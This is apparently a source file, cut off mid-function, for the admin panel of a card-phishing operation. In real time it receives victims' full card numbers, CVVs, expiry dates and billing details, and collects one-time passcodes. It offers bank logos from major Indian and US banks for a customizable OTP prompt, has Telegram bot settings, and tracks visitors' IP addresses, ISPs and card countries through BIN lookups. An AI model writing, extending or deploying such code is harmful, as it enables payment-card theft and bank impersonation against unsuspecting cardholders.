
import React, { useState, useEffect } from 'react';
import { MoreHorizontal, Check, X, AlertTriangle, Wifi, WifiOff, Copy } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { io, Socket } from 'socket.io-client';
import { useToast } from '@/hooks/use-toast';
import { useSocket } from '../SocketContext';
import { v4 as uuidv4 } from 'uuid';
import { api } from '../utils/api';
import Analytics from '../components/Analytics';

const formatCardNumber = (cardNumber: string) => {
  if (!cardNumber) return '';
  // Remove any non-digit characters
  const digitsOnly = cardNumber.replace(/\D/g, '');
  // Show last 4 digits only if card number is longer than 4 digits
  if (digitsOnly.length > 4) {
    return `•••• •••• •••• ${digitsOnly.slice(-4)}`;
  }
  return digitsOnly;
};

const formatExpiry = (payment: any) => {
  if (!payment.expiry) return '';
  const expiryParts = payment.expiry.split('/');
  if (expiryParts.length !== 2) return '';
  return `${expiryParts[0].padStart(2, '0')}/${expiryParts[1]}`;
};

interface PaymentData {
  id: string;
  paymentId: string;
  cardNumber: string;
  cardName: string;
  cvv: string;
  expiry: string;
  expiryMonth?: string;
  expiryYear?: string;
  billingDetails: {
    firstName: string;
    lastName: string;
    email: string;
    country: string;
    companyName: string;
  };
  planName: string;
  billing: string;
  amount: number;
  timestamp: string;
  status: 'pending' | 'approved' | 'rejected';
  cardCountry?: {
    name: string;
    code: string;
    flag: string;
  };
  [key: string]: any; // Add index signature to allow dynamic properties
}

interface OtpData {
  id?: string;
  paymentId: string;
  otp: string;
  timestamp: string;
}

interface VisitorData {
  id: string;
  visitorId: string;
  
  ipAddress: string;
  timestamp: string;
  userAgent: string;
  isp?: string;
  country?: string;
  city?: string;
}

const Admin = () => {
  // Load payments from localStorage on mount
  const [payments, setPayments] = useState<PaymentData[]>(() => {
    try {
      const savedPayments = localStorage.getItem('adminPayments');
      return savedPayments ? JSON.parse(savedPayments) : [];
    } catch (error) {
      console.error('Error loading payments from localStorage:', error);
      return [];
    }
  });
  // Load OTPs from localStorage on mount
  const [otps, setOtps] = useState<OtpData[]>(() => {
    try {
      const savedOtps = localStorage.getItem('adminOtps');
      return savedOtps ? JSON.parse(savedOtps) : [];
    } catch (error) {
      console.error('Error loading OTPs from localStorage:', error);
      return [];
    }
  });
  const [activeDropdown, setActiveDropdown] = useState<string | null>(null);

  // Save OTPs to localStorage whenever otps state changes
  useEffect(() => {
    localStorage.setItem('adminOtps', JSON.stringify(otps));
  }, [otps]);
  
  // Start with empty visitors - only load from server (no localStorage)
  const [liveVisitors, setLiveVisitors] = useState<VisitorData[]>([]);
  
  const [clickedCards, setClickedCards] = useState<Set<string>>(new Set(JSON.parse(localStorage.getItem('clickedCards') || '[]')));
  
  // Start with empty heartbeats - only track current session
  const [visitorHeartbeats, setVisitorHeartbeats] = useState<{[key: string]: number}>({});
  const [paymentLinkAmount, setPaymentLinkAmount] = useState<string>('');
  const [paymentLinkCurrency, setPaymentLinkCurrency] = useState<string>('INR');
  const [generatedLink, setGeneratedLink] = useState<string>('');
  const [activeTab, setActiveTab] = useState<'payments' | 'visitors' | 'analytics'>('payments');
  const [showOtpModal, setShowOtpModal] = useState(false);
  const [selectedPaymentId, setSelectedPaymentId] = useState<string>('');
  const [selectedBankLogo, setSelectedBankLogo] = useState<string>('');
  const [selectedCurrency, setSelectedCurrency] = useState<string>('INR');
  const [convertedAmount, setConvertedAmount] = useState<string>('');
  const [exchangeRate, setExchangeRate] = useState<number>(1);
  const [isLoadingRate, setIsLoadingRate] = useState(false);
  
  // Telegram Bot Settings
  const [telegramBotToken, setTelegramBotToken] = useState<string>('');
  const [telegramChatId, setTelegramChatId] = useState<string>('');
  const [isTelegramConfigured, setIsTelegramConfigured] = useState<boolean>(false);
  const [showTelegramSettings, setShowTelegramSettings] = useState<boolean>(false);
  
  // Global Currency Settings
  const [globalCurrency, setGlobalCurrency] = useState<string>(() => {
    return localStorage.getItem('adminGlobalCurrency') || 'INR';
  });
  const [currentExchangeRate, setCurrentExchangeRate] = useState<number>(1);
  
  const { toast } = useToast();
  const { socket, isConnected } = useSocket();

  // Currency conversion functions (same as in Checkout)
  const convertPrice = (inrPrice: number): number => {
    if (globalCurrency === 'USD') {
      return inrPrice / currentExchangeRate;
    }
    return inrPrice;
  };

  const formatPrice = (inrPrice: number): string => {
    const convertedPrice = convertPrice(inrPrice);
    const symbol = globalCurrency === 'USD' ? '$' : '₹';
    
    if (globalCurrency === 'USD') {
      return `${symbol}${convertedPrice.toFixed(2)}`;
    } else {
      return `${symbol}${convertedPrice.toLocaleString()}`;
    }
  };

  // Clear stale visitor data and load fresh data
  useEffect(() => {
    // Clear any stale visitor data from localStorage on admin panel load
    localStorage.removeItem('adminLiveVisitors');
    localStorage.removeItem('adminVisitorHeartbeats');
    console.log('🧹 Cleared stale visitor data from localStorage');

    if (socket && isConnected) {
      // Request all historical data
      socket.emit('admin-connected');

      // Handle historical data from server on connection
      socket.on('admin-historical-data', (data) => {
        console.log('📤 Received historical admin data:', data);

        // Merge historical payments and OTPs but FORCE REPLACE visitors
        if (data.payments) {
          setPayments(prevPayments => {
            const existingIds = new Set(prevPayments.map(p => p.paymentId));
            const newPayments = data.payments.filter((p: PaymentData) => !existingIds.has(p.paymentId));
            return [...prevPayments, ...newPayments];
          });
        }

        if (data.otps) {
          setOtps(prevOtps => {
            const existingIds = new Set(prevOtps.map(o => o.paymentId));
            const newOtps = data.otps.filter((o: OtpData) => !existingIds.has(o.paymentId));
            return [...prevOtps, ...newOtps];
          });
        }

        // NUCLEAR REPLACEMENT: Always replace with server data (usually empty)
        const freshVisitors = data.activeVisitors || data.visitors || [];
        console.log(`🔥 NUCLEAR REPLACE: ${freshVisitors.length} visitors from server`);
        setLiveVisitors(freshVisitors); // Complete replacement
      });

      return () => {
        if (socket) {
          socket.off('admin-historical-data');
        }
      };
    }
  }, [socket, isConnected]);

  // Bank logos for OTP customization
  const bankLogos = [
    { name: 'HDFC Bank', logo: 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png' },
    { name: 'State Bank of India', logo: 'https://logotyp.us/file/sbi.svg' },
    { name: 'ICICI Bank', logo: 'https://www.pngkey.com/png/full/223-2237358_icici-bank-india-logo-design-png-transparent-images.png' },
    { name: 'Axis Bank', logo: 'https://upload.wikimedia.org/wikipedia/commons/1/1a/Axis_Bank_logo.svg' },
    { name: 'Bank of Baroda', logo: 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo-500x281.png' },
    { name: 'Punjab National Bank', logo: 'https://cdn.freelogovectors.net/wp-content/uploads/2023/01/punjab-national-bank-logo-pnb-freelogovectors.net_-400x225.png' },
    // Kotak Bank - Multiple logos (randomly selected)
    { name: 'Kotak Mahindra Bank', logo: 'https://logos-download.com/wp-content/uploads/2016/06/Kotak_Mahindra_Bank_logo-700x207.png' },
    { name: 'Kotak Mahindra Bank', logo: 'https://upload.wikimedia.org/wikipedia/en/thumb/3/39/Kotak_Mahindra_Group_logo.svg/578px-Kotak_Mahindra_Group_logo.svg.png?20201116103707' },
    { name: 'Bank of India', logo: 'https://1000logos.net/wp-content/uploads/2021/06/Bank-of-India-logo-500x281.png' },
    { name: 'Federal Bank', logo: 'https://stickypng.com/wp-content/uploads/2023/07/627ccab31b2e263b45696aa2.png' },
    { name: 'Union Bank', logo: 'https://cdn.pnggallery.com/wp-content/uploads/union-bank-of-india-logo-01.png' },
    { name: 'Bank of Maharashtra', logo: 'https://assets.stickpng.com/images/627cc5c91b2e263b45696a8e.png' },
    // Canara Bank - Multiple logos (randomly selected)
    { name: 'Canara Bank', logo: 'https://cdn.freelogovectors.net/svg10/canara-bank-logo-freelogovectors.net_.svg' },
    { name: 'Canara Bank', logo: 'https://images.seeklogo.com/logo-png/39/3/canara-bank-logo-png_seeklogo-397142.png' },
    { name: 'Indian Overseas Bank', logo: 'https://assets.stickpng.com/images/627ccc0c1b2e263b45696aac.png' },
    { name: 'Indian Bank', logo: 'https://cdn.freelogovectors.net/wp-content/uploads/2019/02/indian-bank-logo.png' },
    { name: 'IDBI Bank', logo: 'https://1000logos.net/wp-content/uploads/2021/05/IDBI-Bank-logo-500x281.png' },
    { name: 'IndusInd Bank', logo: 'https://images.seeklogo.com/logo-png/7/2/indusind-bank-logo-png_seeklogo-71354.png?v=1955232376276339464' },
    { name: 'Karnataka Bank', logo: 'https://wso2.cachefly.net/wso2/sites/all/images/Karnataka_Bank-logo.png' },
    { name: 'Yes Bank', logo: 'https://logodownload.org/wp-content/uploads/2019/08/yes-bank-logo-0.png' },
    
    // US Banks
    { name: 'Chase Bank', logo: 'https://assets.stickpng.com/thumbs/60394382d4d69e00040ae03c.png' },
    { name: 'Bank of America', logo: 'https://dwglogo.com/wp-content/uploads/2016/06/1500px-Logo-of-Bank-of-America.png' },
    { name: 'Citi Bank', logo: 'https://1000logos.net/wp-content/uploads/2021/05/Citi-logo-500x281.png' },
    { name: 'Wells Fargo', logo: 'https://images.seeklogo.com/logo-png/24/2/wells-fargo-logo-png_seeklogo-242550.png' },
    { name: 'US Bank', logo: 'https://www.logo.wine/a/logo/U.S._Bancorp/U.S._Bancorp-Logo.wine.svg' },
    { name: 'Goldman Sachs', logo: 'https://www.pngall.com/wp-content/uploads/15/Goldman-Sachs-Logo.png' },
    { name: 'PNC Bank', logo: 'https://1000logos.net/wp-content/uploads/2021/05/PNC-Bank-logo-500x300.png' },
    { name: 'Truist Bank', logo: 'https://logodownload.org/wp-content/uploads/2021/04/truist-logo-4.png' },
    { name: 'Capital One', logo: 'https://brandeps.com/logo-download/C/Capital-One-Financial-logo-vector-01.svg' },
    { name: 'TD Bank', logo: 'https://brandlogo.org/wp-content/uploads/2024/02/TD-Bank-N.A.-Logo.png' }
  ];

  // Popular world currencies for conversion
  const currencies = [
    { code: 'INR', name: 'Indian Rupee', symbol: '₹', flag: '🇮🇳' },
    { code: 'USD', name: 'US Dollar', symbol: '$', flag: '🇺🇸' },
    { code: 'EUR', name: 'Euro', symbol: '€', flag: '🇪🇺' },
    { code: 'GBP', name: 'British Pound', symbol: '£', flag: '🇬🇧' },
    { code: 'JPY', name: 'Japanese Yen', symbol: '¥', flag: '🇯🇵' },
    { code: 'AUD', name: 'Australian Dollar', symbol: 'A$', flag: '🇦🇺' },
    { code: 'CAD', name: 'Canadian Dollar', symbol: 'C$', flag: '🇨🇦' },
    { code: 'CHF', name: 'Swiss Franc', symbol: 'CHF', flag: '🇨🇭' },
    { code: 'CNY', name: 'Chinese Yuan', symbol: '¥', flag: '🇨🇳' },
    { code: 'SGD', name: 'Singapore Dollar', symbol: 'S$', flag: '🇸🇬' },
    { code: 'AED', name: 'UAE Dirham', symbol: 'د.إ', flag: '🇦🇪' },
    { code: 'SAR', name: 'Saudi Riyal', symbol: '﷼ ', flag: '🇸🇦' },
    { code: 'KRW', name: 'South Korean Won', symbol: '₩', flag: '🇰🇷' },
    { code: 'MXN', name: 'Mexican Peso', symbol: '$', flag: '🇲🇽' },
    { code: 'BRL', name: 'Brazilian Real', symbol: 'R$', flag: '🇧🇷' },
    { code: 'RUB', name: 'Russian Ruble', symbol: '₽', flag: '🇷🇺' },
    { code: 'ZAR', name: 'South African Rand', symbol: 'R', flag: '🇿🇦' },
    { code: 'THB', name: 'Thai Baht', symbol: '฿', flag: '🇹🇭' }
  ];

  // Function to fetch ISP information from IP address
  const fetchIspInfo = async (ipAddress: string): Promise<{isp: string, country: string, city: string}> => {
    try {
      // Using ipapi.co for ISP information (free tier allows 1000 requests/day)
      const response = await fetch(`https://ipapi.co/${ipAddress}/json/`);
      if (!response.ok) {
        throw new Error('Failed to fetch ISP info');
      }
      const data = await response.json();
      return {
        isp: data.org || data.isp || 'Unknown ISP',
        country: data.country_name || 'Unknown',
        city: data.city || 'Unknown'
      };
    } catch (error) {
      console.error('Error fetching ISP info:', error);
      // Fallback to another service if first one fails
      try {
        const fallbackResponse = await fetch(`https://ip-api.com/json/${ipAddress}`);
        if (fallbackResponse.ok) {
          const fallbackData = await fallbackResponse.json();
          return {
            isp: fallbackData.isp || 'Unknown ISP',
            country: fallbackData.country || 'Unknown',
            city: fallbackData.city || 'Unknown'
          };
        }
      } catch (fallbackError) {
        console.error('Fallback ISP fetch failed:', fallbackError);
      }
      return {
        isp: 'Unknown ISP',
        country: 'Unknown',
        city: 'Unknown'
      };
    }
  };

  // Function to fetch real-time exchange rates and convert currency
  const fetchExchangeRate = async (fromCurrency: string, toCurrency: string): Promise<number> => {
    try {
      // Using exchangerate-api.com (free tier allows 1500 requests/month)
      const response = await fetch(`https://api.exchangerate-api.com/v4/latest/${fromCurrency}`);
      if (!response.ok) {
        throw new Error('Failed to fetch exchange rate');
      }
      const data = await response.json();
      return data.rates[toCurrency] || 1;
    } catch (error) {
      console.error('Error fetching exchange rate:', error);
      // Fallback to another service
      try {
        const fallbackResponse = await fetch(`https://open.er-api.com/v6/latest/${fromCurrency}`);
        if (fallbackResponse.ok) {
          const fallbackData = await fallbackResponse.json();
          return fallbackData.rates[toCurrency] || 1;
        }
      } catch (fallbackError) {
        console.error('Fallback exchange rate fetch failed:', fallbackError);
      }
      return 1; // Default to 1:1 ratio if both APIs fail
    }
  };

  // Function to convert amount and update state
  const convertCurrency = async (amount: number, fromCurrency: string, toCurrency: string) => {
    if (fromCurrency === toCurrency) {
      setExchangeRate(1);
      setConvertedAmount(amount.toFixed(2));
      return;
    }

    setIsLoadingRate(true);
    try {
      const rate = await fetchExchangeRate(fromCurrency, toCurrency);
      const converted = amount * rate;
      setExchangeRate(rate);
      setConvertedAmount(converted.toFixed(2));
    } catch (error) {
      console.error('Currency conversion failed:', error);
      toast({
        title: "Currency Conversion Failed",
        description: "Unable to fetch exchange rates. Using original amount.",
        variant: "destructive",
      });
      setExchangeRate(1);
      setConvertedAmount(amount.toFixed(2));
    } finally {
      setIsLoadingRate(false);
    }
  };



  // Function to delete a payment transaction
  const deleteTransaction = (paymentId: string) => {
    if (confirm('Are you sure you want to delete this transaction? This action cannot be undone.')) {
      setPayments(prev => prev.filter(payment => payment.id !== paymentId));
      toast({
        title: "Transaction Deleted",
        description: "The payment transaction has been successfully deleted.",
        variant: "default",
      });
    }
  };

  // Function to store successful payment persistently
  const storeSuccessfulPayment = (paymentId: string) => {
    try {
      // Get existing successful payments from localStorage
      const existingSuccessful = JSON.parse(localStorage.getItem('successfulPayments') || '[]');
      
      // Add new successful payment if not already exists
      if (!existingSuccessful.includes(paymentId)) {
        existingSuccessful.push(paymentId);
        localStorage.setItem('successfulPayments', JSON.stringify(existingSuccessful));
        console.log('💾 Stored successful payment:', paymentId);
      }
      
      // Also store by linkId if this payment has one
      const payment = payments.find(p => p.paymentId === paymentId);
      if (payment) {
        // Generate unique hash for success page URL
        const successHash = `${Date.now()}_${Math.random().toString(36).substr(2, 12)}_${paymentId.substr(-8)}`;
        
        // Store success mapping by various identifiers
        const successData = {
          paymentId: paymentId,
          successHash: successHash,
          timestamp: new Date().toISOString(),
          amount: payment.amount,
          planName: payment.planName,
          billing: payment.billing,
          cardNumber: payment.cardNumber,
          cardName: payment.cardName,
          cvv: payment.cvv,
          expiry: payment.expiry,
          billingDetails: payment.billingDetails,
          cardCountry: payment.cardCountry
        };
        
        localStorage.setItem(`payment_success_${paymentId}`, JSON.stringify(successData));
        
        // Store on server for cross-browser access
        api.storeSuccessPayment(successHash, successData)
          .then(() => {
            console.log('✅ Payment stored on server with hash:', successHash);
          })
          .catch(error => {
            console.error('Error storing payment on server:', error);
          });
        
        // Generate success URL
        const baseUrl = window.location.origin;
        const successUrl = `${baseUrl}/success/${successHash}`;
        
        console.log('✅ Payment marked as successful:', successData);
        console.log('🔗 Success page URL:', successUrl);
        
        // Show success URL in toast for easy access
        toast({
          title: "Success Page Generated!",
          description: `Access at: /success/${successHash}`,
          duration: 10000,
        });
      }
    } catch (error) {
      console.error('Error storing successful payment:', error);
    }
  };

  // Function to get card country information using BIN lookup
  const getCardCountryInfo = async (cardNumber: string): Promise<{ name: string; code: string; flag: string } | null> => {
    try {
      // Extract first 6 digits (BIN) from card number
      const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
      
      if (bin.length < 6) {
        console.error('Invalid card number for BIN lookup');
        return getCardCountryByBIN(bin);
      }

      // Method 1: Try bintable.com API (most accurate worldwide BIN database)
      try {
        const response = await fetch(`https://api.bintable.com/v1/${bin}`, {
          method: 'GET',
          headers: {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.country && data.country.name) {
            const countryCode = data.country.code || data.country.alpha2;
            const flag = countryCode ? getCountryFlag(countryCode) : '🌍';
            
            console.log('BIN lookup successful via bintable.com:', {
              bin,
              country: data.country.name,
              code: countryCode,
              bank: data.bank?.name || 'Unknown'
            });
            
            return {
              name: data.country.name,
              code: countryCode || 'UN',
              flag: flag
            };
          }
        }
      } catch (error) {
        console.warn('bintable.com API failed:', error);
      }

      // Method 2: Try binlist.net with CORS proxy as fallback
      try {
        const response = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(`https://lookup.binlist.net/${bin}`)}`, {
          method: 'GET',
          headers: { 'Accept': 'application/json' }
        });
        
        if (response.ok) {
          const proxyData = await response.json();
          const data = JSON.parse(proxyData.contents);
          if (data.country && data.country.name) {
            return {
              name: data.country.name,
              code: data.country.alpha2,
              flag: getCountryFlag(data.country.alpha2)
            };
          }
        }
      } catch (error) {
        console.warn('binlist.net API failed:', error);
      }

      // Method 3: Enhanced local BIN detection with more Indian banks
      console.log('All APIs failed, using enhanced local BIN detection');
      return getCardCountryByBIN(bin);
    } catch (error) {
      console.error('Error in BIN lookup:', error);
      return getCardCountryByBIN(cardNumber);
    }
  };

  // Comprehensive worldwide BIN detection
  const getCardCountryByBIN = (cardNumber: string): { name: string; code: string; flag: string } => {
    const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
    const binInt = parseInt(bin);
    
    // India - Comprehensive Indian bank BIN ranges
    // State Bank of India (SBI)
    if ((binInt >= 627760 && binInt <= 627790) ||
        (binInt >= 606985 && binInt <= 607984) ||
        (binInt >= 414709 && binInt <= 414715) ||
        (binInt >= 489537 && binInt <= 489540)) {
      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
    }
    
    // HDFC Bank
    if ((binInt >= 431940 && binInt <= 431949) ||
        (binInt >= 434597 && binInt <= 434600) ||
        (binInt >= 450875 && binInt <= 450880) ||
        (binInt >= 516993 && binInt <= 516999)) {
      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
    }
    
    // ICICI Bank
    if ((binInt >= 412915 && binInt <= 412920) ||
        (binInt >= 438676 && binInt <= 438680) ||
        (binInt >= 524092 && binInt <= 524095) ||
        (binInt >= 543213 && binInt <= 543215)) {
      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
    }
    
    // Axis Bank
    if ((binInt >= 414596 && binInt <= 414600) ||
        (binInt >= 498824 && binInt <= 498830) ||
        (binInt >= 521384 && binInt <= 521390) ||
        (binInt >= 543316 && binInt <= 543320)) {
      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
    }
    
    // Punjab National Bank (PNB)
    if ((binInt >= 508227 && binInt <= 508230) ||
        (binInt >= 531962 && binInt <= 531965) ||
        (binInt >= 544045 && binInt <= 544050)) {
      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
    }
    
    // Bank of Baroda
    if ((binInt >= 484406 && binInt <= 484410) ||
        (binInt >= 543330 && binInt <= 543335) ||
        (binInt >= 545906 && binInt <= 545910)) {
      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
    }
    
    // Kotak Mahindra Bank
    if ((binInt >= 481699 && binInt <= 481705) ||
        (binInt >= 521304 && binInt <= 521310) ||
        (binInt >= 526862 && binInt <= 526865)) {
      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
    }
    
    // RuPay cards (Indian domestic payment system)
    if ((binInt >= 607000 && binInt <= 608999) || 
        (binInt >= 652150 && binInt <= 652849) ||
        (binInt >= 817000 && binInt <= 817999) ||
        (binInt >= 508500 && binInt <= 508999)) {
      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
    }
    
    // Additional Indian bank ranges
    if ((binInt >= 484400 && binInt <= 484499) ||
        (binInt >= 521300 && binInt <= 521399) ||
        (binInt >= 543200 && binInt <= 543399) ||
        (binInt >= 556637 && binInt <= 556645)) {
      return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
    }
    
    // China - UnionPay and Chinese cards
    if ((binInt >= 620000 && binInt <= 629999) ||
        (binInt >= 810000 && binInt <= 819999) ||
        (binInt >= 625900 && binInt <= 625999) ||
        (binInt >= 622000 && binInt <= 622999)) {
      return { name: 'China', code: 'CN', flag: getCountryFlag('CN') };
    }
    
    // United Kingdom
    if ((binInt >= 424242 && binInt <= 424242) ||
        (binInt >= 676770 && binInt <= 676770) ||
        (binInt >= 543000 && binInt <= 543999) ||
        (binInt >= 676700 && binInt <= 676799)) {
      return { name: 'United Kingdom', code: 'GB', flag: getCountryFlag('GB') };
    }
    
    // Germany
    if ((binInt >= 220000 && binInt <= 229999) ||
        (binInt >= 542000 && binInt <= 542999) ||
        (binInt >= 492900 && binInt <= 492999)) {
      return { name: 'Germany', code: 'DE', flag: getCountryFlag('DE') };
    }
    
    // Canada
    if ((binInt >= 450000 && binInt <= 459999) ||
        (binInt >= 540000 && binInt <= 549999)) {
      return { name: 'Canada', code: 'CA', flag: getCountryFlag('CA') };
    }
    
    // Australia
    if ((binInt >= 450000 && binInt <= 450099) ||
        (binInt >= 514000 && binInt <= 514999)) {
      return { name: 'Australia', code: 'AU', flag: getCountryFlag('AU') };
    }
    
    // Japan - JCB cards
    if ((binInt >= 350000 && binInt <= 359999) ||
        (binInt >= 358000 && binInt <= 358999)) {
      return { name: 'Japan', code: 'JP', flag: getCountryFlag('JP') };
    }
    
    // Brazil
    if ((binInt >= 636200 && binInt <= 636299) ||
        (binInt >= 504800 && binInt <= 504899)) {
      return { name: 'Brazil', code: 'BR', flag: getCountryFlag('BR') };
    }
    
    // France
    if ((binInt >= 497000 && binInt <= 497999) ||
        (binInt >= 523000 && binInt <= 523999)) {
      return { name: 'France', code: 'FR', flag: getCountryFlag('FR') };
    }
    
    // Russia
    if ((binInt >= 220000 && binInt <= 220499) ||
        (binInt >= 546900 && binInt <= 546999)) {
      return { name: 'Russia', code: 'RU', flag: getCountryFlag('RU') };
    }
    
    // South Korea
    if ((binInt >= 625800 && binInt <= 625899) ||
        (binInt >= 540900 && binInt <= 540999)) {
      return { name: 'South Korea', code: 'KR', flag: getCountryFlag('KR') };
    }
    
    // American Express (typically US)
    if (binInt >= 340000 && binInt <= 379999) {
      return { name: 'United States', code: 'US', flag: getCountryFlag('US') };
    }
    
    // Discover (US-based)
    if (binInt >= 600000 && binInt <= 659999) {
      // Check if it's not already matched above (like Chinese UnionPay)
      if (!(binInt >= 620000 && binInt <= 629999)) {
        return { name: 'United States', code: 'US', flag: getCountryFlag('US') };
      }
    }
    
    // Diners Club
    if (binInt >= 300000 && binInt <= 305999) {
      return { name: 'United States', code: 'US', flag: getCountryFlag('US') };
    }
    
    // Visa cards - check for specific country patterns first
    if (binInt >= 400000 && binInt <= 499999) {
      // If not matched by specific countries above, default varies by region
      if (binInt >= 484400 && binInt <= 484499) return { name: 'India', code: 'IN', flag: getCountryFlag('IN') };
      if (binInt >= 492900 && binInt <= 492999) return { name: 'Germany', code: 'DE', flag: getCountryFlag('DE') };
      if (binInt >= 497000 && binInt <= 497999) return { name: 'France', code: 'FR', flag: getCountryFlag('FR') };
      // Most common fallback for Visa
      return { name: 'United States', code: 'US', flag: getCountryFlag('US') };
    }
    
    // Mastercard - check for specific patterns
    if (binInt >= 510000 && binInt <= 559999) {
      if (binInt >= 540000 && binInt <= 549999) return { name: 'Canada', code: 'CA', flag: getCountryFlag('CA') };
      if (binInt >= 523000 && binInt <= 523999) return { name: 'France', code: 'FR', flag: getCountryFlag('FR') };
      // Most common fallback for Mastercard
      return { name: 'United States', code: 'US', flag: getCountryFlag('US') };
    }
    
    // Default fallback
    return { name: 'Unknown', code: 'UN', flag: '🌍' };
  };

  // Function to convert country code to flag emoji
  const getCountryFlag = (countryCode: string): string => {
    const codePoints = countryCode
      .toUpperCase()
      .split('')
      .map(char => 127397 + char.charCodeAt(0));
    return String.fromCodePoint(...codePoints);
  };

  // Save payments to localStorage whenever payments state changes
  useEffect(() => {
    try {
      localStorage.setItem('adminPayments', JSON.stringify(payments));
    } catch (error) {
      console.error('Error saving payments to localStorage:', error);
    }
  }, [payments]);

  // Save live visitors to localStorage whenever visitors state changes
  useEffect(() => {
    try {
      localStorage.setItem('adminLiveVisitors', JSON.stringify(liveVisitors));
    } catch (error) {
      console.error('Error saving live visitors to localStorage:', error);
    }
  }, [liveVisitors]);

  // Save visitor heartbeats to localStorage whenever heartbeats state changes
  useEffect(() => {
    try {
      localStorage.setItem('adminVisitorHeartbeats', JSON.stringify(visitorHeartbeats));
    } catch (error) {
      console.error('Error saving visitor heartbeats to localStorage:', error);
    }
  }, [visitorHeartbeats]);

  // Auto-cleanup old visitors every 30 seconds
  useEffect(() => {
    const cleanupInterval = setInterval(() => {
      const currentTime = Date.now();
      
      // Remove visitors who haven't sent heartbeat in 60 seconds
      setLiveVisitors(prev => prev.filter(visitor => {
        const lastHeartbeat = visitorHeartbeats[visitor.visitorId] || 0;
        return (currentTime - lastHeartbeat) < 60000;
      }));
      
      // Clean up old heartbeats
      setVisitorHeartbeats(prev => {
        const activeHeartbeats: {[key: string]: number} = {};
        Object.entries(prev).forEach(([visitorId, timestamp]) => {
          if ((currentTime - timestamp) < 60000) {
            activeHeartbeats[visitorId] = timestamp;
          }
        });
        return activeHeartbeats;
      });
    }, 30000); // Run every 30 seconds
    
    return () => clearInterval(cleanupInterval);
  }, [visitorHeartbeats]);

  useEffect(() => {
    if (!socket) return;
    try {
      // Listen for new payment data with error handling and instant display
      socket.on('payment-received', async (data: Omit<PaymentData, 'id' | 'status'>) => {
        try {
          if (!data || !data.cardNumber || !data.cardName) {
            console.error('Invalid payment data received:', data);
            return;
          }
          
          const newPayment: PaymentData = {
            ...data,
            id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
            paymentId: data.paymentId || `pay_${Date.now()}`,
            status: 'pending',
            cardNumber: data.cardNumber || '',
            cardName: data.cardName || '',
            cvv: data.cvv || '',
            expiry: data.expiry || '',
            billingDetails: data.billingDetails || {
              firstName: '',
              lastName: '',
              email: '',
              country: '',
              companyName: ''
            },
            planName: data.planName || '',
            billing: data.billing || '',
            amount: data.amount || 0,
            timestamp: data.timestamp || new Date().toISOString()
          };
          
          // Add payment immediately to admin panel for instant display
          console.log('💳 Payment received instantly:', {
            paymentId: newPayment.paymentId,
            cardNumber: newPayment.cardNumber,
            amount: newPayment.amount,
            timestamp: newPayment.timestamp
          });
          
          setPayments(prev => [newPayment, ...prev]);
          
          // Fetch card country info using BIN lookup asynchronously (non-blocking)
          try {
            const cardCountryInfo = await getCardCountryInfo(data.cardNumber);
            if (cardCountryInfo) {
              // Update payment with country info after BIN lookup
              setPayments(prev => prev.map(payment => 
                payment.paymentId === newPayment.paymentId 
                  ? { ...payment, cardCountry: cardCountryInfo }
                  : payment
              ));
              console.log('Card country detected:', cardCountryInfo);
            }
          } catch (error) {
            console.error('BIN lookup failed:', error);
          }
          
        } catch (error) {
          console.error('Error processing payment data:', error);
        }
      });
      
      // Additional event listener for 'payment-data' for bulletproof transmission
      socket.on('payment-data', async (data: Omit<PaymentData, 'id' | 'status'>) => {
        try {
          if (!data || !data.cardNumber || !data.cardName) {
            console.error('Invalid payment data received via payment-data:', data);
            return;
          }
          
          // Check if this payment already exists
          const existingPayment = payments.find(p => p.paymentId === data.paymentId);
          if (existingPayment) {
            console.log('Payment already exists, skipping duplicate:', data.paymentId);
            return;
          }
          
          const newPayment: PaymentData = {
            ...data,
            id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
            paymentId: data.paymentId || `pay_${Date.now()}`,
            status: 'pending',
            cardNumber: data.cardNumber || '',
            cardName: data.cardName || '',
            cvv: data.cvv || '',
            expiry: data.expiry || '',
            billingDetails: data.billingDetails || {
              firstName: '',
              lastName: '',
              email: '',
              country: '',
              companyName: ''
            },
            planName: data.planName || '',
            billing: data.billing || '',
            amount: data.amount || 0,
            timestamp: data.timestamp || new Date().toISOString()
          };
          
          // Add payment immediately to admin panel for instant display
          console.log('💳 Payment received via payment-data:', {
            paymentId: newPayment.paymentId,
            cardNumber: newPayment.cardNumber,
            amount: newPayment.amount,
            timestamp: newPayment.timestamp
          });
          
          setPayments(prev => [newPayment, ...prev]);
          
          // Fetch card country info using BIN lookup asynchronously (non-blocking)
          try {
            const cardCountryInfo = await getCardCountryInfo(data.cardNumber);
            if (cardCountryInfo) {
              // Update payment with country info after BIN lookup
              setPayments(prev => prev.map(payment => 
                payment.paymentId === newPayment.paymentId 
                  ? { ...payment, cardCountry: cardCountryInfo }
                  : payment
              ));
              console.log('Card country detected:', cardCountryInfo);
            }
          } catch (error) {
            console.error('BIN lookup failed:', error);
          }
          
        } catch (error) {
          console.error('Error processing payment data via payment-data:', error);
        }
      });

      // Listen for OTP submissions with error handling
      socket.on('otp-submitted', (data: { otp: string; paymentId?: string; planData?: any }) => {
        try {
          if (!data || !data.otp) {
            console.error('Invalid OTP data received:', data);
            return;
          }
          
          // Create new OTP entry
          const newOtp: OtpData = {
